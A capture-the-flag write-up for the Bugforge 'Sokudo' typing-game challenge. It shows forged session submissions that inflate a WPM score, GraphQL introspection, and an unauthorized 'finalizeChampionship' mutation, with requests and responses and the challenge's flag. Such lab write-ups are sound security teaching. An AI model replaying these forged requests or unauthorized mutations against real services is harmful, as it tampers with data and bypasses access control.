# Sokudo — sokudo-006 — Can you finalise the championship results?

## Challenge

**Name:** Sokudo
**Platform:** Bugforge
**Hint:** *Can you finalise the championship results?*

---

## 1. Application Reconnaissance

After opening the challenge URL, I registered a new account and explored the application.

The application contained:

* A typing practice page
* A statistics page
* A championship standings page

I started a typing session and observed the request sent when the session ended.

The application submitted the result automatically to:

```http
POST /api/session/submit
```

---

## 2. Inspecting the Session Submission

The original request contained:

```json
{
  "duration": 15,
  "textGenerated": "Knowing yourself is the beginning of all wisdom. Knowing you",
  "userInput": "",
  "timeElapsed": 15
}
```

The server responded:

```json
{
  "id": 1,
  "wpm": 0,
  "accuracy": 0,
  "charsTyped": 0,
  "correctChars": 0,
  "message": "Session saved successfully"
}
```

This suggested that the server was accepting important typing-result data directly from the client.

---

## 3. Manipulating `userInput`

I used Firefox's **Edit and Resend** functionality to modify the request.

I replaced the empty `userInput` with repeated copies of the generated text:

```json
{
  "duration": 15,
  "textGenerated": "Knowing yourself is the beginning of all wisdom. Knowing you",
  "userInput": "Knowing yourself is the beginning of all wisdom. Knowing youKnowing yourself is the beginning of all wisdom. Knowing youKnowing yourself is the beginning of all wisdom. Knowing you",
  "timeElapsed": 15
}
```

The server accepted the modified request:

```json
{
  "id": 2,
  "wpm": 144,
  "accuracy": 33.33,
  "charsTyped": 180,
  "correctChars": 60,
  "message": "Session saved successfully"
}
```

This demonstrated that the server trusted client-supplied session data instead of independently verifying the typing activity.

## 6. Discovering the GraphQL API

While inspecting the network requests generated by the championship page, I found:

```http
POST /api/graphql
```

The request contained a GraphQL query:

```graphql
{
  currentSeason {
    id
    name
    status
    standings {
      rank
      username
      wpm
      accuracy
    }
  }
}
```

The response showed:

```json
{
  "data": {
    "currentSeason": {
      "id": "1",
      "name": "Spring 2026 Velocity Championship",
      "status": "open",
      "standings": [
        {
          "rank": 1,
          "username": "speedtyper",
          "wpm": 142.6,
          "accuracy": 99.2
```

## 7. GraphQL Introspection

I used GraphQL introspection to determine what operations were available.

Request:

```json
{
  "query": "{ __schema { queryType { fields { name } } mutationType { fields { name } } } }"
}
```

Response:

```json
{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          {
            "name": "currentSeason"
          }
        ]
      },
      "mutationType": {
        "fields": [
          {
            "name": "finalizeChampionship"
          }
        ]
      }
    }
  }
}
```

The exposed mutation was particularly interesting:

```text
finalizeChampionship
```

## 8. Finding the Mutation Arguments

I queried the `Mutation` type:

```graphql
{
  __type(name:"Mutation") {
    fields {
      name
      args {
        name
        type {
          kind
          name
          ofType {
            kind
            name
          }
        }
      }
      type {
        kind
        name
        ofType {
          kind
          name
        }
      }
    }
  }
}
```

The response revealed:

```json
{
  "name": "finalizeChampionship",
  "args": [
    {
      "name": "seasonId",
      "type": {
        "kind": "NON_NULL",
        "ofType": {
          "kind": "SCALAR",
          "name": "ID"
        }
      }
    }
  ],
  "type": {
    "kind": "NON_NULL",
    "ofType": {
      "kind": "OBJECT",
      "name": "ChampionshipResult"
    }
  }
}
```

Therefore the mutation required:

```text
finalizeChampionship(seasonId: ID!)
```

I also inspected `ChampionshipResult` and found these fields:

```text
seasonId
champion
finalized
prizeCode
```

---

## 9. Finalizing the Championship

Since the current season ID was `1`, I manually sent:

```json
{
  "query": "mutation { finalizeChampionship(seasonId:\"1\") { seasonId champion finalized prizeCode } }"
}
```

The server returned:

```json
{
  "data": {
    "finalizeChampionship": {
      "seasonId": "1",
      "champion": "speedtyper",
      "finalized": true,
      "prizeCode": "bug{5TJdQbGSePOKjOFoGeoskRm8L7Y0nKhq}"
    }
  }
}
```

The championship was successfully finalized.

## Vulnerability Summary

The challenge involved two interesting trust/authorization issues:

### Client-side result manipulation

The `/api/session/submit` endpoint accepted client-controlled values such as:

```text
userInput
duration
timeElapsed
```

without sufficiently validating that they represented a legitimate typing session.

This allowed an artificially high WPM score to be stored.

### Unauthorized championship finalization

The more important issue for completing the challenge was the exposed GraphQL mutation:

```graphql
finalizeChampionship(seasonId: ID!)
```

The mutation was accessible through the authenticated GraphQL API without an apparent requirement for a privileged championship administrator.

Calling it with:

```text
seasonId = 1
```

finalized the championship and returned the challenge's prize code.
